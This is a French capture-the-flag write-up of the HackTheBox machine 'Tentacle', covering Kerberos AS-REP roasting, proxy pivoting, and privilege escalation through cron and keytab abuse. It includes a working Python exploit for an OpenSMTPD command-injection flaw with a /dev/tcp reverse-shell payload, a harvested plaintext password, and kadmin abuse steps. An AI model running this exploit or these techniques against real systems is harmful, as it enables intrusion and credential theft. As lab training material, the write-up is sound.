---
title: "HackTheBox - Tentacle"
layout: "post"
categories: "Linux"
tags: ["Kerberos", "HackTheBox", "Writeup", "Pivoting"]
---

Bonjour à tous aujourd'hui je vous présente un walkthrough sur une machine difficile de HackTheBox. Cette machine demandait une énumération assez poussée, être familié avec proxychains et de bonnes connaissances sur le protocole kerberos. 😀

# Recon

## Port Scanning

Tout d'abord, faisons un scan TCP + UDP des 65535 ports avec l'outil [masscan](https://github.com/robertdavidgraham/masscan) pour plus de rapidité :

```bash
❯ sudo masscan 10.10.10.224 -p1-65535,U:1-65535 --rate=500 -e tun0

Discovered open port 88/tcp on 10.10.10.224
Discovered open port 22/tcp on 10.10.10.224
Discovered open port 3128/tcp on 10.10.10.224
Discovered open port 53/udp on 10.10.10.224
Discovered open port 53/tcp on 10.10.10.224
```

Ensuite, enregistrons la sortie dans un fichier nommé masscan et faisons un scan plus avancé avec des NSE sur les ports ouverts :

```bash
❯ export ports=$(cat masscan | awk '{print $4}' | grep -o '[0-9]\+' | tr '\n' ',') && echo $ports
88,22,3128,53,53
❯ nmap -p $ports -sCV -oN nmap 10.10.10.224 -Pn

PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA)
|   256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA)
|_  256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519)
53/tcp   open  domain       ISC BIND 9.11.20 (RedHat Enterprise Linux 8)
| dns-nsid:
|_  bind.version: 9.11.20-RedHat-9.11.20-5.el8
88/tcp   open  kerberos-sec MIT Kerberos (server time: 2021-06-19 15:02:50Z)
3128/tcp open  http-proxy   Squid http proxy 4.11
|_http-server-header: squid/4.11
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: Host: REALCORP.HTB; OS: Linux; CPE: cpe:/o:redhat:enterprise_linux:8
```

Sur le serveur distant, nous avons 4 services :
- Un serveur SSH sur le port 22
- Un serveur DNS sur le port 53
- Un serveur Kerberos sur le port 88
- Un proxy Squid sur le port 3128

Je suppose que la machine cible tourne sur la distribution linux Red Hat par rapport à la réponse DNS et que l'host de la machine est REALCORP.HTB.

## Enumeration Squid proxy

En tentant d'accéder au proxy nous découvrons un utilisateur : `j.nakazawa`, un nom de domaine : `realcorp.htb` et un sous-domaine : `srv01.realcorp.htb`:

![discovery_user_host_subdomain](https://i.imgur.com/aVXsYmp.png)

Cette utilisateur est AS-REP Roastable, nous pouvons donc récupérer son ticket Kerberos à partir du KDC mais le hash Kerberos 5 AS-REP etype 23 est incassable :

```bash
❯ GetNPUsers.py -dc-ip 10.10.10.224 -no-pass realcorp.htb/j.nakazawa

[*] Getting TGT for j.nakazawa
$krb5asrep$18$j.nakazawa@REALCORP.HTB:19231d6324028ef033447c744cecff89$3820ac18d889cbc260ae2bdb37ae95df0c7668b3f0b1c210a30b8cc93152a8335d5e1d884a2691cec399041be849255b927c1055b0922cc9d3ddff2028a9ce9b22cdfa1cc57493ad0d3d5900c64ea0a7da48a42324b8334ce11ea3752f0aee4d5260dfb2434452960ea6e9f9540a223392717cdb28b8b538e41f98e1ca521d0968d03073e2ab61845f9af5d01f9faa4fed0e57ec477c71ecb8c56f7de38d6d07cb9cdb4a6d72357bbb0a60b719fdef19cc0f2eb9190572eb15d2b0e85a1031b1576c19e2e236414830131c044fcc835c5d886e284005d01a7365
```

## Enumeration DNS server

Pour automatiser notre énumération je vais utiliser [DNSEnum](https://eromang.zataz.com/2009/06/04/dnsenum-informations-noms-domaine/) :

```bash
❯ dnsenum -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --dnsserver 10.10.10.224 realcorp.htb

-----   realcorp.htb   -----
ns.realcorp.htb.                         259200   IN    A        10.197.243.77
proxy.realcorp.htb.                      259200   IN    CNAME    ns.realcorp.htb.
ns.realcorp.htb.                         259200   IN    A        10.197.243.77
wpad.realcorp.htb.                       259200   IN    A        10.197.243.31
```

DNSEnum est un outil qui en autonomie :
- identifie les **enregistrements DNS** (MX, NS, A records) et les **nameservers**
- brute force les **sous-domaines** (via wordlists et google scraping)
- Effectue un **reverse lookup**
- Envoie des **requêtes AXFR** aux nameservers

Plusieurs IP et sous-domaines ont été trouvés ! 😁

Pour y accéder nous avons besoin d'utiliser [proxychains4](https://github.com/rofl0r/proxychains-ng) afin de pivoter à partir de l'IP principale pour accéder aux autres en nous connectant au proxy Squid.

## Proxychains4 Configuration

Proxychains fonctionne pour les paquets TCP mais pas UDP, donc avec nmap, si nous voulons scanner à travers un proxy il va falloir rajouter le paramètre **-sT** pour préciser à nmap de faire un **scan TCP** (et non SYN par défaut)

Proxychains va prendre en compte les proxies de haut en bas, deplus il y a plusieurs options :

- **Strict chaining**, proxychains suit obligatoirement le chemin donné dans `/etc/proxychains.conf`
- **Dynamic chaining**, proxychains va d'abord détecter si le proxy est up avant de l'utiliser
- **Random chaining**, tout est dans le nom, il va pas suivre un ordre précis

10.197.243.77 accepte seulement les requêtes venant du localhost c'est pour cela que nous devons passer par plusieurs proxies car la configuration directive `http_access allow localhost` est activé.

Dans notre cas, nous allons devoir ajouter cette liste de proxies à l'intérieur du fichier de configuration de proxychains4 `/etc/proxychains4.conf` :

```
http  10.10.10.224 3128
http  127.0.0.1 3128
http  10.197.243.77 3128
```

## Enumeration subdomains

### Nmap 10.197.243.77

```bash
❯ proxychains4 -f /etc/proxychains4.conf nmap -sT 10.197.243.77 -Pn

PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
88/tcp   open  kerberos-sec
464/tcp  open  kpasswd5
749/tcp  open  kerberos-adm
3128/tcp open  squid-http
```

### Nmap 10.197.243.31

```bash
❯ proxychains4 -f /etc/proxychains4.conf nmap -sT 10.197.243.31 -Pn

PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
464/tcp  open  kpasswd5
749/tcp  open  kerberos-adm
3128/tcp open  squid-http
```

Nous avons un serveur Web sur la machine 10.197.243.31 ayant comme nom de domaine wpad.realcorp.htb :

![wpad_403](https://i.imgur.com/xOyNtTp.png)

Cependant nous avons pas les permissions d'accéder à l'index du serveur Web.

Après m'être renseigné sur [wpad](http://eole.ac-dijon.fr/documentations/2.4/completes/HTML/ModuleAmon/co/13-wpad.html), j'ai compris qu'il existait un fichier PAC nommé `wpad.dat` qui contient les paramètres du proxy :

![wpad_dat](https://i.imgur.com/ysntqIk.png)

À l'intérieur de ce fichier, nous avons une nouvelle IP avec une partie réseau différente.

Cependant cette machine ne répond pas. Nous supposons que ceci est un indice pour trouver une nouvelle machine... Scannons une plage d'IP :

```bash
❯ proxychains4 -f /etc/proxychains4.conf nmap 10.241.251.0/24 -vvv -sT -Pn

<...>
[proxychains] Dynamic chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  10.241.251.113:25  ...  OK
Discovered open port 25/tcp on 10.241.251.113
<...>
Nmap scan report for 10.241.251.113
PORT   STATE SERVICE REASON
25/tcp open  smtp    syn-ack
```

Nous avons trouvé un serveur SMTP sur la machine 10.241.251.113.

Avec du **banner grabbing** nous pouvous identifier la version du service en marche sur le serveur distant rapidement :

```bash
❯ proxychains4 -f /etc/proxychains4.conf nc 10.241.251.113 25

[proxychains] Dynamic chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  10.241.251.113:25  ...  OK
220 smtp.realcorp.htb ESMTP OpenSMTPD
```

Après quelques recherches, j'ai trouvé une [vulnérabilité OpenSMTPD](https://blog.firosolutions.com/exploits/opensmtpd-remote-vulnerability/). 😃

# Exploitation OpenSMTPD (Source code review)

Si la partie locale d'une adresse mail n'est pas valide et ne comporte pas de nom de domaine, un attaquant peut transmettre un reverse shell et ignorer les contrôles **MAILADDR_ALLOWED** et **MAILADDR_ESCAPE** grâce à cette faille.

Nous allons modifier le code afin d'exécuter un reverse shell :

```py
import socket, time
import sys

HOST = input('RHOST : ')
PORT = int(input('RPORT : '))
LHOST = input('LHOST : ')
LPORT = int(input('LPORT : '))
pld_rev_shell = 'bash -c "exec bash -i &> /dev/tcp/{}/{} <&1"'.format(LHOST, LPORT)
s = None

payload = b"""\r\n
#0\r\n
#1\r\n
#2\r\n
#3\r\n
#4\r\n
#5\r\n
#6\r\n
#7\r\n
#8\r\n
#9\r\n
#a\r\n
#b\r\n
#c\r\n
#d\r\n
""" + pld_rev_shell.encode() + b"""
.
"""
for res in socket.getaddrinfo(HOST, PORT, socket.AF_UNSPEC, socket.SOCK_STREAM):
    af, socktype, proto, canonname, sa = res
    try:
        s = socket.socket(af, socktype, proto)
    except OSError as msg:
        s = None
        continue
    try:
        s.connect(sa)
    except OSError as msg:
        s.close()
        s = None
        continue
    break
if s is None:
    print('could not open socket')
    sys.exit(1)
with s:
	data = s.recv(1024)
	time.sleep(1)
	s.send(b"helo test.com\r\n")
	data = s.recv(1024)
	s.send(b"MAIL FROM:<;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;>\r\n")
	time.sleep(1)
	data = s.recv(1024)
	s.send(b"RCPT TO:<j.nakazawa@realcorp.htb>\r\n")
	data = s.recv(1024)
	s.send(b"DATA\r\n")
	data = s.recv(1024)
	s.send(payload)
	data = s.recv(1024)
	s.send(b"QUIT\r\n")
	data = s.recv(1024)
s.close()
```

![foothold](https://i.imgur.com/LggXAoJ.png)

Nous avons enfin un foothold sur la machine et nous sommes même root du serveur SMTP ! 😊

# Pivoting to j.nakazawa of srv01

Une énumération rapide est suffisante pour trouver des credentials dans un fichier de configuration nommé [.msmtprc](https://doc.ubuntu-fr.org/msmtp) à l'intérieur du répertoire personnel de j.nakazawa :

```bash
root@smtp:/home/j.nakazawa# grep 'user\|password' .msmtprc
user           j.nakazawa
password       sJB}RM>6Z~64_
```

Nous pouvons éventuellement utiliser ces identifiants pour nous connecter en SSH au nom de domaine srv01.realcorp.htb, cependant les logs ne fonctionnent pas.
Je suis resté bloqué ici avant de penser que nous avons 2 moyens d'authentification : SSH et Kerberos.

## Exploitation SSH via Kerberos

Essayons de générer un ticket Kerberos et de l'utiliser afin de nous connecter en tant que utilisateur.

([Comment Kerberos fonctionne-t-il avec SSH ?](https://qastack.fr/server/329901/how-does-kerberos-work-with-ssh))

Voici un schéma pour comprendre le fonctionnement de Kerberos avec SSH :

![kerberos_with_ssh](https://i.imgur.com/wha225T.png)

Nous avons besoin d'un client [Kerberos](https://guide.ubuntu-fr.org/server/kerberos.html) notamment [krb5-user](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/conf_files/krb5_conf.html#krb5-conf-5)

Tout d'abord, je vais changer le realm par défaut dans `/etc/krb5.conf` ainsi que le KDC avec la bonne IP, on obtient donc :

```bash
default_realm = REALCORP.HTB

REALCORP.HTB = {
        kdc = 10.10.10.224
        }
```

Ensuite, je génére un ticket avec [kinit](https://directory.apache.org/apacheds/kerberos-ug/4.1-authenticate-kinit.html) :

```bash
❯ kinit j.nakazawa

Password for j.nakazawa@REALCORP.HTB: sJB}RM>6Z~64_
```

Sachez que nous pouvons lister les tickets crées avec la commande klist :

```bash
❯ klist

Ticket cache: FILE:/tmp/krb5cc_1001
Default principal: j.nakazawa@REALCORP.HTB

Valid starting       Expires              Service principal
14/03/2021 08:58:20  15/03/2021 08:58:19  krbtgt/REALCORP.HTB@REALCORP.HTB
```

Maintenant nous pouvons nous connecter en SSH avec notre utilisateur 😰 :

![log_in_ssh_j_nakazawa](https://i.imgur.com/ym3wuqR.png)

Nous sommes enfin connecté en tant que j.nakazawa et on peut afficher le flag user ! 🙂

# Horizontal Privilege Escalation / Lateral Movement

Nous avons un cron appartenant au groupe admin inhabituel :

```bash
[j.nakazawa@srv01 ~]$ cat /etc/crontab

SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

* * * * * admin /usr/local/bin/log_backup.sh
```

Le script bash contient ce code :

```bash
#!/bin/bash
/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/
cd /home/admin
/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log
/usr/bin/rm -f access.log cache.log
```

## Exploitation cron

    Ligne 1 : Copie de tous les fichiers et dossiers de **/var/log/squid/ vers /home/admin/** avec [rsync](https://doc.ubuntu-fr.org/rsync).
    Ligne 2 : Il se déplace dans le répertoire personnel de admin
    Ligne 3 : Créer une archive [tar](https://doc.ubuntu-fr.org/tar) s'appelant squid_logs.tar.gz.<la_date_heure> contenant les logs du proxy squid
    Ligne 4 : Supprime les fichiers logs inutiles

Nous avons pas les droits de liste les éléments dans /var/log/squid cependant nous avons les permissions d'écriture dans ce répertoire.
Le but va être d'ajouter un moyen d'authentification à l'intérieur du /home/admin et pour cela nous avons simplement besoin d'ajouter ce moyen d'authentification à l'intérieur du répertoire de log Squid grâce au cron backup.

Après avoir essayer d'ajouter notre clef publique aux authorized_keys SSH de admin mais sans succès. J'ai compris qu'il existait un fichier [.k5login](https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5.4/doc/krb5-user/Granting-Access-to-Your-Account.html) qui permet de s'identifier :

![schema_k5login](https://i.imgur.com/0JjBwKS.png)

Si `pam_krb5` est appelé en phase d'autorisation, il vérifie s'il ~/.k5login existe. Si tel est le cas, il doit répertorier le principal Kerberos du client. Sinon, le seul principal autorisé est username@DEFAULT-REALM.

Nous devons alors créer un fichier .k5login dans le répertoire personnel de j.nakazawa :

```bash
[j.nakazawa@srv01 ~]$ echo 'j.nakazawa@REALCORP.HTB' > .k5login
```

Ainsi que dans le répertoire de admin, pour cela nous devons copier notre .k5login dans les logs Squid :

```bash
[j.nakazawa@srv01 ~]$ cp .k5login /var/log/squid/
```

Après execution du cron nous pouvons nous connecter en tant que admin :

![ssh_as_admin](https://i.imgur.com/pEX8ZU6.png)

Nous sommes maintenant admin du domaine srv01 ! 🥳

# Pivot from admin to root

Avec [LinEnum](https://github.com/rebootuser/LinEnum) / [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) ou à la main, nous pouvons trouver un fichier [keytab](https://docs.oracle.com/cd/E24843_01/html/E23285/aadmin-10.html) intéréssant appartenant au groupe admin situé au path `/etc/krb5.keytab` :

```bash
[admin@srv01 ~]$ find / \( -path /sys -o -path /proc -o -path /run \) -prune -false -o -group admin 2>/dev/null

/etc/krb5.keytab
/usr/local/bin/log_backup.sh
/home/admin
/home/admin/.ssh
/home/admin/squid_logs.tar.gz.2021-03-14-151301
/home/admin/squid_logs.tar.gz.2021-03-14-151401
/home/admin/squid_logs.tar.gz.2021-03-14-151501
```

Tous les hôtes qui fournissent un service disposent d'un fichier local, appelé un keytab. Le fichier [keytab](https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5.4/doc/krb5-install/The-Keytab-File.html) contient le principal pour le service approprié, appelé clé de service. Une clé de service est utilisée par un service pour s'authentifier auprès du KDC et est uniquement connue de Kerberos et du service lui-même.
Par exemple, si vous avez un serveur NFS utilisant Kerberos, le serveur doit avoir un fichier keytab qui contient son principal de service nfs.
On peut utiliser un fichier keytab pour nous authentifier auprès d'un serveur distant à l'aide de Kerberos sans saisir de mot de passe.

Nous pouvons lire un fichier keytab avec [klist](https://docs.bmc.com/docs/ServerAutomation/85/configuring-after-installation/administering-security/implementing-authentication/implementing-active-directory-kerberos-authentication/configuring-an-authentication-service-for-ad-kerberos-authentication/creating-the-blappserv_login-conf-file-ad-kerberos/using-klist-to-read-the-keytab-file) :

```bash
[admin@srv01 ~]$ klist -t -k /etc/krb5.keytab

Keytab name: FILE:/etc/krb5.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   2 08/12/2020 22:15:30 host/srv01.realcorp.htb@REALCORP.HTB
   2 08/12/2020 22:15:30 host/srv01.realcorp.htb@REALCORP.HTB
   2 08/12/2020 22:15:30 host/srv01.realcorp.htb@REALCORP.HTB
   2 08/12/2020 22:15:30 host/srv01.realcorp.htb@REALCORP.HTB
   2 08/12/2020 22:15:30 host/srv01.realcorp.htb@REALCORP.HTB
   2 19/12/2020 06:00:42 kadmin/changepw@REALCORP.HTB
   2 19/12/2020 06:00:42 kadmin/changepw@REALCORP.HTB
   2 19/12/2020 06:00:42 kadmin/changepw@REALCORP.HTB
   2 19/12/2020 06:00:42 kadmin/changepw@REALCORP.HTB
   2 19/12/2020 06:00:42 kadmin/changepw@REALCORP.HTB
   2 19/12/2020 06:10:53 kadmin/admin@REALCORP.HTB
   2 19/12/2020 06:10:53 kadmin/admin@REALCORP.HTB
   2 19/12/2020 06:10:53 kadmin/admin@REALCORP.HTB
   2 19/12/2020 06:10:53 kadmin/admin@REALCORP.HTB
   2 19/12/2020 06:10:53 kadmin/admin@REALCORP.HTB
```

Nous allons utiliser [kadmin](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/admin_commands/kadmin_local.html#kadmin-1) pour [ajouter un principal root](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/admin_commands/kadmin_local.html#kadmin-1) de service Kerberos dans notre fichier keytab :

```bash
[admin@srv01 ~]$ kadmin -k -t /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB

Authenticating as principal kadmin/admin@REALCORP.HTB with keytab /etc/krb5.keytab.
kadmin:  add_principal root@REALCORP.HTB
Enter password for principal "root@REALCORP.HTB": nuts
Re-enter password for principal "root@REALCORP.HTB": nuts
```

Nous pouvons enfin nous connecter en tant que root à l'aide de [ksu](https://www.oreilly.com/library/view/linux-security-cookbook/0596003919/ch05s20.html)

![rooted](https://i.imgur.com/ejiRXDV.png)

Voila nous sommes enfin root ! 😎
